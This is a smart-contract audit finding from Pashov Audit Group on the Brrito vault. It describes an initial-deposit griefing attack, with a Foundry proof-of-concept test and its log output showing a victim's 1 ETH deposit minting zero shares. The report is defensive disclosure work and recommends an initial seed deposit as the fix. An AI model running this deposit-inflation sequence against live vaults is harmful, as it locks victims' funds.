---
# Core Classification
protocol: Brrito
chain: everychain
category: uncategorized
vulnerability_type: unknown

# Attack Vector Details
attack_type: unknown
affected_component: smart_contract

# Source Information
source: solodit
solodit_id: 31485
audit_firm: Pashov Audit Group
contest_link: none
source_link: https://github.com/pashov/audits/blob/master/team/md/Brrito-security-review.md
github_link: none

# Impact Classification
severity: medium
impact: security_vulnerability
exploitability: 0.00
financial_impact: medium

# Scoring
quality_score: 0
rarity_score: 0

# Context Tags
tags:

# Audit Details
report_date: unknown
finders_count: 1
finders:
  - Pashov Audit Group
---

## Vulnerability Title

[M-03] Initial griefing attack possible

### Overview


This bug report discusses a potential issue with the solady library that could result in users losing their funds. The report explains that there is a known attack that can be used to cause strange behavior in the vault, which could harm users and leave the vault in a problematic state. The report includes a proof of concept that demonstrates the impact of this attack. The report also suggests that the attack is not profitable for the attacker, but it can still cause harm to the victim's funds. The report recommends mitigating this issue by implementing an initial deposit of a small amount.

### Original Finding Content

**Severity**

**Impact:** High, as the victim loses their funds

**Likelihood:** Low, as it comes at a cost for the attacker

**Description**

The famous initial deposit attack is largely mitigated by the solady library. However, doing this attack can cause some weird behavior that could grief users (at high cost of the attacker) and leave the vault in a weird state:

Here's a PoC showing the impacts

```solidity
    address bob = makeAddr("bob");

    function testInitialSupplyAttack() public {
    	// attacker starts with 13 ether
        _getCWETH(13e18 + 6);

        // initial small deposit
        vault.deposit(11,address(this));
        assertEq(10,vault.balanceOf(address(this)));

        // large deposit to inflate the exchange rate
        _COMET.safeTransfer(address(vault),11e18-9);

        // share price is not 1e18 assets
        assertEq(1e18,vault.convertToAssets(1));

        // boilerplate to get cWETHv3
        deal(_WETH,bob,1e18 + 3);
        vm.startPrank(bob);
        _WETH.safeApprove(_COMET,1e18+3);
        IComet(_COMET).supply(_WETH, 1e18+3);
        _COMET.safeApproveWithRetry(address(vault), type(uint256).max);

        // victim deposits into the vault
        vault.deposit(1e18+1,bob);
        // due to exchange rate gets 0 shares
        assertEq(0,vault.balanceOf(bob));
        vm.stopPrank();

        vault.redeem(10, address(this), address(this));
        console.log("exchange rate",vault.convertToAssets(1));
        console.log("_COMET.balanceOf(address(vault))",_COMET.balanceOf(address(vault)));
        console.log("_COMET.balanceOf(address(attacker))",_COMET.balanceOf(address(this)));
    }
```

with the output:

```
Logs:
  exchange rate 1090909090909090909
  _COMET.balanceOf(address(vault)) 1090909090909090908
  _COMET.balanceOf(address(attacker)) 12909090909090909091
```

As you can see the attacker needs to pay `0.1 eth` for the attack. But they have effectively locked the victims `1 eth` in the contract.

Even though this is not profitable for the attacker it will leave the vault in a weird state and the victim will still have lost his tokens.

**Recommendations**

Consider mitigating this with an initial deposit of a small amount.

### Metadata

| Field | Value |
|-------|-------|
| Impact | MEDIUM |
| Quality Score | 0/5 |
| Rarity Score | 0/5 |
| Audit Firm | Pashov Audit Group |
| Protocol | Brrito |
| Report Date | N/A |
| Finders | Pashov Audit Group |

### Source Links

- **Source**: https://github.com/pashov/audits/blob/master/team/md/Brrito-security-review.md
- **GitHub**: N/A
- **Contest**: N/A

### Keywords for Search

`vulnerability`

